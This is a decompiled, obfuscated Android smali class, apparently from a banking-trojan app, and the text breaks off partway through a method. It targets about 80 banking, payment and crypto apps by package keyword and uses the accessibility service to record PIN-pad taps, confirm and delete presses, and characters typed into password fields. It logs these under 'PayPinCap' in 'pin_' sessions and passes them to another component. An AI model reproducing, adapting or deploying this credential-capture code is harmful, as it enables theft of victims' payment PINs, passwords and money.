.class public abstract Lڝږ؁ڋ/ك;
.super Ljava/lang/Object;
.source "SourceFile"


# static fields
.field public static final ؋:Landroid/os/Handler;

.field public static final ؠ:[Ljava/lang/String;

.field public static final ء:[Ljava/lang/String;

.field public static final آ:[Ljava/lang/String;

.field public static final أ:Ljava/util/concurrent/ConcurrentHashMap;

.field public static volatile ؤ:Ljava/lang/String;

.field public static volatile إ:Ljava/lang/String;

.field public static volatile ئ:J

.field public static volatile ا:J

.field public static ب:Lڝږ؁ڋ/ا;

.field public static final ة:Ljava/util/ArrayList;

.field public static final ت:Ljava/util/ArrayList;

.field public static volatile ث:Z

.field public static final ج:Ljava/util/concurrent/ConcurrentHashMap;


# direct methods
.method public static constructor <clinit>()V
    .locals 82

    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    sput-object v0, Lڝږ؁ڋ/ك;->؋:Landroid/os/Handler;

    const-string v2, "bank"

    const-string v3, "banking"

    const-string v4, "pay"

    const-string v5, "payment"

    const-string v6, "wallet"

    const-string v7, "upi"

    const-string v8, "finance"

    const-string v9, "fintech"

    const-string v10, "money"

    const-string v11, "crypto"

    const-string v12, "bitcoin"

    const-string v13, "trading"

    const-string v14, "invest"

    const-string v15, "broker"

    const-string v16, "exchange"

    const-string v17, "loan"

    const-string v18, "credit"

    const-string v19, "lending"

    const-string v20, "transfer"

    const-string v21, "remit"

    const-string v22, "checkout"

    const-string v23, "billing"

    const-string v24, "phonepe"

    const-string v25, "paytm"

    const-string v26, "gpay"

    const-string v27, "bhim"

    const-string v28, "dana"

    const-string v29, "ovo"

    const-string v30, "gopay"

    const-string v31, "gcash"

    const-string v32, "maya"

    const-string v33, "paymaya"

    const-string v34, "momo"

    const-string v35, "zalopay"

    const-string v36, "vnpay"

    const-string v37, "mpesa"

    const-string v38, "pesa"

    const-string v39, "cashapp"

    const-string v40, "venmo"

    const-string v41, "zelle"

    const-string v42, "alipay"

    const-string v43, "wechat"

    const-string v44, "grab"

    const-string v45, "gojek"

    const-string v46, "shopee"

    const-string v47, "lazada"

    const-string v48, "tokopedia"

    const-string v49, "revolut"

    const-string v50, "wise"

    const-string v51, "stripe"

    const-string v52, "razorpay"

    const-string v53, "flutterwave"

    const-string v54, "icici"

    const-string v55, "hdfc"

    const-string v56, "sbi"

    const-string v57, "axis"

    const-string v58, "kotak"

    const-string v59, "bca"

    const-string v60, "bni"

    const-string v61, "bri"

    const-string v62, "mandiri"

    const-string v63, "cimb"

    const-string v64, "maybank"

    const-string v65, "dbs"

    const-string v66, "ocbc"

    const-string v67, "uob"

    const-string v68, "chase"

    const-string v69, "citi"

    const-string v70, "barclays"

    const-string v71, "hsbc"

    const-string v72, "binance"

    const-string v73, "coinbase"

    const-string v74, "okx"

    const-string v75, "bybit"

    const-string v76, "kucoin"

    const-string v77, "safaricom"

    const-string v78, "stcpay"

    const-string v79, "nubank"

    const-string v80, "mercadopago"

    const-string v81, "picpay"

    filled-new-array/range {v2 .. v81}, [Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lڝږ؁ڋ/ك;->ؠ:[Ljava/lang/String;

    const-string v1, "confirm"

    const-string v2, "ok"

    const-string v3, "done"

    const-string v4, "pay"

    const-string v5, "submit"

    const-string v6, "next"

    const-string v7, "login"

    const-string v8, "sign in"

    const-string v9, "\u786e\u8ba4"

    const-string v10, "\u786e\u5b9a"

    const-string v11, "\u652f\u4ed8"

    const-string v12, "\u4ed8\u6b3e"

    const-string v13, "\u767b\u5f55"

    const-string v14, "\u4e0b\u4e00\u6b65"

    const-string v15, "\u5b8c\u6210"

    const-string v16, "\u9a8c\u8bc1"

    const-string v17, "bayar"

    const-string v18, "kirim"

    const-string v19, "lanjut"

    const-string v20, "masuk"

    const-string v21, "konfirmasi"

    const-string v22, "\u0e22\u0e37\u0e19\u0e22\u0e31\u0e19"

    const-string v23, "\u0e0a\u0e33\u0e23\u0e30"

    const-string v24, "\u0e40\u0e02\u0e49\u0e32\u0e2a\u0e39\u0e48\u0e23\u0e30\u0e1a\u0e1a"

    filled-new-array/range {v1 .. v24}, [Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lڝږ؁ڋ/ك;->ء:[Ljava/lang/String;

    const-string v1, "delete"

    const-string v2, "backspace"

    const-string v3, "del"

    const-string v4, "clear"

    const-string v5, "erase"

    const-string v6, "back"

    const-string v7, "\u5220\u9664"

    const-string v8, "\u9000\u683c"

    const-string v9, "\u6e05\u9664"

    const-string v10, "hapus"

    filled-new-array/range {v1 .. v10}, [Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lڝږ؁ڋ/ك;->آ:[Ljava/lang/String;

    new-instance v0, Ljava/util/concurrent/ConcurrentHashMap;

    invoke-direct {v0}, Ljava/util/concurrent/ConcurrentHashMap;-><init>()V

    sput-object v0, Lڝږ؁ڋ/ك;->أ:Ljava/util/concurrent/ConcurrentHashMap;

    const/4 v0, 0x0

    sput-object v0, Lڝږ؁ڋ/ك;->ؤ:Ljava/lang/String;

    sput-object v0, Lڝږ؁ڋ/ك;->إ:Ljava/lang/String;

    const-wide/16 v1, 0x0

    sput-wide v1, Lڝږ؁ڋ/ك;->ئ:J

    sput-wide v1, Lڝږ؁ڋ/ك;->ا:J

    sput-object v0, Lڝږ؁ڋ/ك;->ب:Lڝږ؁ڋ/ا;

    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    sput-object v0, Lڝږ؁ڋ/ك;->ة:Ljava/util/ArrayList;

    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    sput-object v0, Lڝږ؁ڋ/ك;->ت:Ljava/util/ArrayList;

    const/4 v0, 0x0

    sput-boolean v0, Lڝږ؁ڋ/ك;->ث:Z

    new-instance v0, Ljava/util/concurrent/ConcurrentHashMap;

    invoke-direct {v0}, Ljava/util/concurrent/ConcurrentHashMap;-><init>()V

    sput-object v0, Lڝږ؁ڋ/ك;->ج:Ljava/util/concurrent/ConcurrentHashMap;

    return-void
.end method

.method public static ؋(Ljava/lang/String;)V
    .locals 6

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v0

    sget-object v2, Lڝږ؁ڋ/ك;->إ:Ljava/lang/String;

    if-eqz v2, :cond_0

    sget-object v2, Lڝږ؁ڋ/ك;->ؤ:Ljava/lang/String;

    invoke-virtual {p0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_0

    sget-wide v2, Lڝږ؁ڋ/ك;->ئ:J

    sub-long v2, v0, v2

    const-wide/16 v4, 0x7530

    cmp-long v2, v2, v4

    if-lez v2, :cond_1

    :cond_0
    sput-object p0, Lڝږ؁ڋ/ك;->ؤ:Ljava/lang/String;

    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "pin_"

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p0, "_"

    invoke-virtual {v2, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v0, v1}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0

    sput-object p0, Lڝږ؁ڋ/ك;->إ:Ljava/lang/String;

    new-instance p0, Ljava/lang/StringBuilder;

    const-string v2, "New session: "

    invoke-direct {p0, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget-object v2, Lڝږ؁ڋ/ك;->إ:Ljava/lang/String;

    invoke-virtual {p0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0

    const-string v2, "PayPinCap"

    invoke-static {v2, p0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    :cond_1
    sput-wide v0, Lڝږ؁ڋ/ك;->ئ:J

    return-void
.end method

.method public static ؠ(Landroid/view/accessibility/AccessibilityNodeInfo;I)V
    .locals 7

    const/16 v0, 0x8

    if-le p1, v0, :cond_0

    goto/16 :goto_4

    :cond_0
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->isClickable()Z

    move-result v0

    const/4 v1, 0x1

    const/4 v2, 0x0

    if-eqz v0, :cond_8

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v0

    if-eqz v0, :cond_1

    invoke-interface {v0}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v3

    if-ne v3, v1, :cond_1

    invoke-virtual {v0, v2}, Ljava/lang/String;->charAt(I)C

    move-result v3

    invoke-static {v3}, Lڝږ؁ڋ/ك;->أ(C)Z

    move-result v3

    if-eqz v3, :cond_1

    goto/16 :goto_2

    :cond_1
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getContentDescription()Ljava/lang/CharSequence;

    move-result-object v0

    if-eqz v0, :cond_7

    invoke-interface {v0}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v3

    if-ne v3, v1, :cond_2

    invoke-virtual {v0, v2}, Ljava/lang/String;->charAt(I)C

    move-result v3

    invoke-static {v3}, Lڝږ؁ڋ/ك;->أ(C)Z

    move-result v3

    if-eqz v3, :cond_2

    goto :goto_2

    :cond_2
    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v3

    if-lt v3, v1, :cond_3

    invoke-virtual {v0, v2}, Ljava/lang/String;->charAt(I)C

    move-result v3

    invoke-static {v3}, Ljava/lang/Character;->isDigit(C)Z

    move-result v3

    if-eqz v3, :cond_3

    invoke-virtual {v0, v2}, Ljava/lang/String;->charAt(I)C

    move-result v0

    invoke-static {v0}, Ljava/lang/String;->valueOf(C)Ljava/lang/String;

    move-result-object v0

    goto :goto_2

    :cond_3
    invoke-virtual {v0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v0

    sget-object v3, Lڝږ؁ڋ/ك;->آ:[Ljava/lang/String;

    array-length v4, v3

    move v5, v2

    :goto_0
    if-ge v5, v4, :cond_5

    aget-object v6, v3, v5

    invoke-virtual {v0, v6}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v6

    if-eqz v6, :cond_4

    const-string v0, "[DEL]"

    goto :goto_2

    :cond_4
    add-int/lit8 v5, v5, 0x1

    goto :goto_0

    :cond_5
    sget-object v3, Lڝږ؁ڋ/ك;->ء:[Ljava/lang/String;

    array-length v4, v3

    move v5, v2

    :goto_1
    if-ge v5, v4, :cond_7

    aget-object v6, v3, v5

    invoke-virtual {v0, v6}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v6

    if-eqz v6, :cond_6

    const-string v0, "[CONFIRM]"

    goto :goto_2

    :cond_6
    add-int/lit8 v5, v5, 0x1

    goto :goto_1

    :cond_7
    const/4 v0, 0x0

    :goto_2
    if-eqz v0, :cond_8

    new-instance v3, Landroid/graphics/Rect;

    invoke-direct {v3}, Landroid/graphics/Rect;-><init>()V

    invoke-virtual {p0, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->getBoundsInScreen(Landroid/graphics/Rect;)V

    sget-object v4, Lڝږ؁ڋ/ك;->ة:Ljava/util/ArrayList;

    invoke-virtual {v4, v3}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    sget-object v3, Lڝږ؁ڋ/ك;->ت:Ljava/util/ArrayList;

    invoke-virtual {v3, v0}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    :cond_8
    :goto_3
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v0

    if-ge v2, v0, :cond_a

    const/16 v0, 0x1e

    if-ge v2, v0, :cond_a

    invoke-virtual {p0, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_9

    add-int/lit8 v3, p1, 0x1

    invoke-static {v0, v3}, Lڝږ؁ڋ/ك;->ؠ(Landroid/view/accessibility/AccessibilityNodeInfo;I)V

    :cond_9
    add-int/lit8 v2, v2, 0x1

    goto :goto_3

    :cond_a
    :goto_4
    return-void
.end method

.method public static ء()V
    .locals 3

    sget-object v0, Lڝږ؁ڋ/ك;->ب:Lڝږ؁ڋ/ا;

    const/4 v1, 0x0

    if-eqz v0, :cond_0

    sget-object v2, Lڝږ؁ڋ/ك;->؋:Landroid/os/Handler;

    invoke-virtual {v2, v0}, Landroid/os/Handler;->removeCallbacks(Ljava/lang/Runnable;)V

    sput-object v1, Lڝږ؁ڋ/ك;->ب:Lڝږ؁ڋ/ا;

    :cond_0
    sget-object v0, Lڝږ؁ڋ/ك;->إ:Ljava/lang/String;

    if-eqz v0, :cond_1

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v2, "FLUSH session="

    invoke-direct {v0, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget-object v2, Lڝږ؁ڋ/ك;->إ:Ljava/lang/String;

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    const-string v2, "PayPinCap"

    invoke-static {v2, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    const/4 v0, 0x1

    invoke-static {v0}, Lڜٟٱڀ/ت;->ؠ(Z)V

    sput-object v1, Lڝږ؁ڋ/ك;->إ:Ljava/lang/String;

    :cond_1
    return-void
.end method

.method public static آ(Ljava/lang/String;)Z
    .locals 7

    const/4 v0, 0x0

    if-eqz p0, :cond_4

    invoke-virtual {p0}, Ljava/lang/String;->isEmpty()Z

    move-result v1

    if-eqz v1, :cond_0

    goto :goto_1

    :cond_0
    sget-object v1, Lڝږ؁ڋ/ك;->أ:Ljava/util/concurrent/ConcurrentHashMap;

    invoke-virtual {v1, p0}, Ljava/util/concurrent/ConcurrentHashMap;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Ljava/lang/Boolean;

    if-eqz v2, :cond_1

    invoke-virtual {v2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result p0

    return p0

    :cond_1
    invoke-virtual {p0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v2

    sget-object v3, Lڝږ؁ڋ/ك;->ؠ:[Ljava/lang/String;

    array-length v4, v3

    move v5, v0

    :goto_0
    if-ge v5, v4, :cond_3

    aget-object v6, v3, v5

    invoke-virtual {v2, v6}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v6

    if-eqz v6, :cond_2

    sget-object v0, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    invoke-virtual {v1, p0, v0}, Ljava/util/concurrent/ConcurrentHashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    const/4 p0, 0x1

    return p0

    :cond_2
    add-int/lit8 v5, v5, 0x1

    goto :goto_0

    :cond_3
    sget-object v2, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    invoke-virtual {v1, p0, v2}, Ljava/util/concurrent/ConcurrentHashMap;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    :cond_4
    :goto_1
    return v0
.end method

.method public static أ(C)Z
    .locals 1

    invoke-static {p0}, Ljava/lang/Character;->isDigit(C)Z

    move-result v0

    if-nez v0, :cond_1

    invoke-static {p0}, Ljava/lang/Character;->isLetter(C)Z

    move-result v0

    if-nez v0, :cond_1

    const/16 v0, 0x2e

    if-eq p0, v0, :cond_1

    const/16 v0, 0x40

    if-eq p0, v0, :cond_1

    const/16 v0, 0x23

    if-eq p0, v0, :cond_1

    const/16 v0, 0x21

    if-eq p0, v0, :cond_1

    const/16 v0, 0x24

    if-eq p0, v0, :cond_1

    const/16 v0, 0x25

    if-eq p0, v0, :cond_1

    const/16 v0, 0x26

    if-eq p0, v0, :cond_1

    const/16 v0, 0x2d

    if-eq p0, v0, :cond_1

    const/16 v0, 0x5f

    if-ne p0, v0, :cond_0

    goto :goto_0

    :cond_0
    const/4 p0, 0x0

    goto :goto_1

    :cond_1
    :goto_0
    const/4 p0, 0x1

    :goto_1
    return p0
.end method

.method public static ؤ(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Z)V
    .locals 1

    if-nez p3, :cond_0

    return-void

    :cond_0
    invoke-virtual {p1}, Ljava/lang/String;->isEmpty()Z

    move-result p3

    if-eqz p3, :cond_1

    goto :goto_1

    :cond_1
    invoke-virtual {p1}, Ljava/lang/String;->length()I

    move-result p3

    const/4 v0, 0x1

    if-ne p3, v0, :cond_3

    const/4 p3, 0x0

    invoke-virtual {p1, p3}, Ljava/lang/String;->charAt(I)C

    move-result p1

    const-string p3, "\u2022\u25cf\u25c9\u2731\ufe61*\u25cb\u26ab"

    invoke-virtual {p3, p1}, Ljava/lang/String;->indexOf(I)I

    move-result p3

    if-ltz p3, :cond_2

    goto :goto_1

    :cond_2
    invoke-static {p1}, Lڝږ؁ڋ/ك;->أ(C)Z

    move-result p3

    if-eqz p3, :cond_4

    goto :goto_0

    :cond_3
    invoke-static {p1}, Lڝږ؁ڋ/ك;->ت(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/String;->isEmpty()Z

    move-result p3

    if-nez p3, :cond_4

    invoke-virtual {p1}, Ljava/lang/String;->length()I

    move-result p3

    sub-int/2addr p3, v0

    invoke-virtual {p1, p3}, Ljava/lang/String;->charAt(I)C

    move-result p1

    invoke-static {p1}, Lڝږ؁ڋ/ك;->أ(C)Z

    move-result p3

    if-eqz p3, :cond_4

    :goto_0
    invoke-static {p1}, Ljava/lang/String;->valueOf(C)Ljava/lang/String;

    move-result-object p1

    goto :goto_2

    :cond_4
    :goto_1
    const/4 p1, 0x0

    :goto_2
    if-eqz p1, :cond_6

    invoke-virtual {p1}, Ljava/lang/String;->isEmpty()Z

    move-result p3

    if-eqz p3, :cond_5

    goto :goto_3

    :cond_5
    invoke-static {p0}, Lڝږ؁ڋ/ك;->؋(Ljava/lang/String;)V

    new-instance p3, Ljava/lang/StringBuilder;

    const-string v0, "TEXT_CHG pkg="

    invoke-direct {p3, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {p3, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v0, " char="

    invoke-virtual {p3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p3, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v0, " session="

    invoke-virtual {p3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v0, Lڝږ؁ڋ/ك;->إ:Ljava/lang/String;

    invoke-virtual {p3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p3

    const-string v0, "PayPinCap"

    invoke-static {v0, p3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    const-string p3, "pwd_field"

    invoke-static {p1, p0, p3, p2}, Lڝږ؁ڋ/ك;->ئ(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    invoke-static {}, Lڝږ؁ڋ/ك;->ة()V

    :cond_6
    :goto_3
    return-void
.end method

.method public static إ(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    .locals 10

    if-nez p0, :cond_0

    return-void

    :cond_0
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v0

    const/4 v1, 0x1

    const-string v2, "[CONFIRM]"

    const-string v3, "[DEL]"

    const/4 v4, 0x0

    const/4 v5, 0x3

    if-eqz v0, :cond_4

    invoke-interface {v0}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v6

    if-ne v6, v1, :cond_1

    invoke-virtual {v0, v4}, Ljava/lang/String;->charAt(I)C

    move-result v6

    invoke-static {v6}, Lڝږ؁ڋ/ك;->أ(C)Z

    move-result v6

    if-eqz v6, :cond_1

    goto/16 :goto_a

    :cond_1
    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v6

    if-gt v6, v5, :cond_4

    move v6, v4

    :goto_0
    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v7

    if-ge v6, v7, :cond_3

    invoke-virtual {v0, v6}, Ljava/lang/String;->charAt(I)C

    move-result v7

    invoke-static {v7}, Ljava/lang/Character;->isDigit(C)Z

    move-result v7

    if-nez v7, :cond_2

    move v6, v4

    goto :goto_1

    :cond_2
    add-int/lit8 v6, v6, 0x1

    goto :goto_0

    :cond_3
    move v6, v1

    :goto_1
    if-eqz v6, :cond_4

    goto/16 :goto_a

    :cond_4
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getContentDescription()Ljava/lang/CharSequence;

    move-result-object v0

    const/4 v6, 0x0

    if-eqz v0, :cond_5

    invoke-interface {v0}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object p3

    goto :goto_2

    :cond_5
    if-eqz p3, :cond_6

    :goto_2
    invoke-virtual {p3}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object p3

    move-object v0, p3

    goto :goto_3

    :cond_6
    move-object v0, v6

    :goto_3
    if-eqz v0, :cond_d

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result p3

    if-ne p3, v1, :cond_7

    invoke-virtual {v0, v4}, Ljava/lang/String;->charAt(I)C

    move-result p3

    invoke-static {p3}, Lڝږ؁ڋ/ك;->أ(C)Z

    move-result p3

    if-eqz p3, :cond_7

    goto/16 :goto_a

    :cond_7
    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result p3

    const/16 v7, 0xa

    if-gt p3, v7, :cond_9

    move p3, v4

    :goto_4
    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v7

    if-ge p3, v7, :cond_9

    invoke-virtual {v0, p3}, Ljava/lang/String;->charAt(I)C

    move-result v7

    invoke-static {v7}, Ljava/lang/Character;->isDigit(C)Z

    move-result v8

    if-eqz v8, :cond_8

    invoke-static {v7}, Ljava/lang/String;->valueOf(C)Ljava/lang/String;

    move-result-object v0

    goto/16 :goto_a

    :cond_8
    add-int/lit8 p3, p3, 0x1

    goto :goto_4

    :cond_9
    invoke-virtual {v0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object p3

    sget-object v0, Lڝږ؁ڋ/ك;->آ:[Ljava/lang/String;

    array-length v7, v0

    move v8, v4

    :goto_5
    if-ge v8, v7, :cond_b

    aget-object v9, v0, v8

    invoke-virtual {p3, v9}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v9

    if-eqz v9, :cond_a

    goto/16 :goto_8

    :cond_a
    add-int/lit8 v8, v8, 0x1

    goto :goto_5

    :cond_b
    sget-object v0, Lڝږ؁ڋ/ك;->ء:[Ljava/lang/String;

    array-length v7, v0

    move v8, v4

    :goto_6
    if-ge v8, v7, :cond_d

    aget-object v9, v0, v8

    invoke-virtual {p3, v9}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v9

    if-eqz v9, :cond_c

    goto/16 :goto_7

    :cond_c
    add-int/lit8 v8, v8, 0x1

    goto :goto_6

    :cond_d
    if-eqz p2, :cond_e

    invoke-virtual {p2}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result p2

    if-ne p2, v1, :cond_e

    invoke-virtual {v0, v4}, Ljava/lang/String;->charAt(I)C

    move-result p2

    invoke-static {p2}, Lڝږ؁ڋ/ك;->أ(C)Z

    move-result p2

    if-eqz p2, :cond_e

    goto/16 :goto_a

    :cond_e
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getViewIdResourceName()Ljava/lang/String;

    move-result-object p2

    if-eqz p2, :cond_14

    invoke-virtual {p2}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object p3

    invoke-virtual {p2}, Ljava/lang/String;->length()I

    move-result v0

    if-lez v0, :cond_10

    sub-int/2addr v0, v1

    invoke-virtual {p2, v0}, Ljava/lang/String;->charAt(I)C

    move-result p2

    invoke-static {p2}, Ljava/lang/Character;->isDigit(C)Z

    move-result v0

    if-eqz v0, :cond_10

    const-string v0, "key"

    invoke-virtual {p3, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_f

    const-string v0, "btn"

    invoke-virtual {p3, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_f

    const-string v0, "num"

    invoke-virtual {p3, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_f

    const-string v0, "pin"

    invoke-virtual {p3, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_f

    const-string v0, "pad"

    invoke-virtual {p3, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_10

    :cond_f
    invoke-static {p2}, Ljava/lang/String;->valueOf(C)Ljava/lang/String;

    move-result-object v0

    goto/16 :goto_a

    :cond_10
    const-string p2, "delete"

    invoke-virtual {p3, p2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result p2

    if-nez p2, :cond_13

    const-string p2, "backspace"

    invoke-virtual {p3, p2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result p2

    if-nez p2, :cond_13

    const-string p2, "clear"

    invoke-virtual {p3, p2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result p2

    if-eqz p2, :cond_11

    goto :goto_8

    :cond_11
    const-string p2, "confirm"

    invoke-virtual {p3, p2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result p2

    if-nez p2, :cond_12

    const-string p2, "submit"

    invoke-virtual {p3, p2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result p2

    if-nez p2, :cond_12

    const-string p2, "done"

    invoke-virtual {p3, p2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result p2

    if-nez p2, :cond_12

    const-string p2, "pay"

    invoke-virtual {p3, p2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result p2

    if-nez p2, :cond_12

    const-string p2, "login"

    invoke-virtual {p3, p2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result p2

    if-eqz p2, :cond_14

    :cond_12
    :goto_7
    move-object v0, v2

    goto :goto_a

    :cond_13
    :goto_8
    move-object v0, v3

    goto :goto_a

    :cond_14
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result p2

    if-lez p2, :cond_16

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result p2

    if-gt p2, v5, :cond_16

    move p2, v4

    :goto_9
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result p3

    if-ge p2, p3, :cond_16

    invoke-virtual {p0, p2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p3

    if-eqz p3, :cond_15

    invoke-virtual {p3}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object p3

    if-eqz p3, :cond_15

    invoke-interface {p3}, Ljava/lang/CharSequence;->length()I

    move-result v0

    if-ne v0, v1, :cond_15

    invoke-interface {p3, v4}, Ljava/lang/CharSequence;->charAt(I)C

    move-result v0

    invoke-static {v0}, Lڝږ؁ڋ/ك;->أ(C)Z

    move-result v0

    if-eqz v0, :cond_15

    invoke-interface {p3}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v0

    goto :goto_a

    :cond_15
    add-int/lit8 p2, p2, 0x1

    goto :goto_9

    :cond_16
    move-object v0, v6

    :goto_a
    if-nez v0, :cond_17

    return-void

    :cond_17
    invoke-virtual {v2, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p2

    if-eqz p2, :cond_18

    goto :goto_c

    :cond_18
